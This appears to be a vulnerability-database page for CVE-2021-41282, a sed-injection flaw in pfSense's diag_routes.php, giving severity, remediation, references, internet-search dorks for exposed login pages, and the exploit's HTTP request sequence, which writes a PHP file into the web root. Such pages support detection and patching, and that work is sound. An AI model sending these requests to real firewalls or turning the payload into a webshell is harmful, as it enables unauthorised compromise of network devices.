---
layout: "post"
cve_id: "CVE-2021-41282"
title: "pfSense - Arbitrary File Write"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-41282.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41282.yaml"
author: "cckuailong"
severity: "high"
impact: "Successful exploitation of this vulnerability can lead to unauthorized modification of critical system files, potentially resulting in a complete compromise of the pfSense firewall.
"
remediation: "Upgrade to pfSense CE software version 2.6.0 or later, or pfSense Plus software version 22.01 or later.
"
reference:
  - "https://www.shielder.it/advisories/pfsense-remote-command-execution/"
  - "https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_diag_routes_webshell/"
  - "https://docs.netgate.com/downloads/pfSense-SA-22_02.webgui.asc"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-41282"
  - "https://docs.netgate.com/pfsense/en/latest/releases/22-01_2-6-0.html"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 8.8, 'cve-id': 'CVE-2021-41282', 'cwe-id': 'CWE-74', 'epss-score': 0.9188, 'epss-percentile': 0.99674, 'cpe': 'cpe:2.3:a:pfsense:pfsense:2.5.2:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 4, 'vendor': 'pfsense', 'product': 'pfsense', 'shodan-query': 'http.title:"pfsense - login"', 'fofa-query': 'title="pfsense - login"', 'google-query': 'intitle:"pfsense - login"'}"
tags:
  - "cve2021"
  - "cve"
  - "pfsense"
  - "rce"
  - "authenticated"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
diag_routes.php in pfSense 2.5.2 allows sed data injection. Authenticated users are intended to be able to view data about the routes set in the firewall. The data is retrieved by executing the netstat utility, and then its output is parsed via the sed utility. Although the common protection mechanisms against command injection (e.g., the usage of the escapeshellarg function for the arguments) are used, it is still possible to inject sed-specific code and write an arbitrary file in an arbitrary location.


## üåê HTTP Request
```nohighlight
GET /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Connection: close
Content-Length: 64
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

__csrf_magic=dQ00vM&usernamefld=8kqcOY&passwordfld=0hFLbg&login=
```

```nohighlight
GET /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5(\x27CVE-2021-41282\x27));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/test.php%0a%23 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /test.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.2
Connection: close
Accept-Encoding: gzip
```

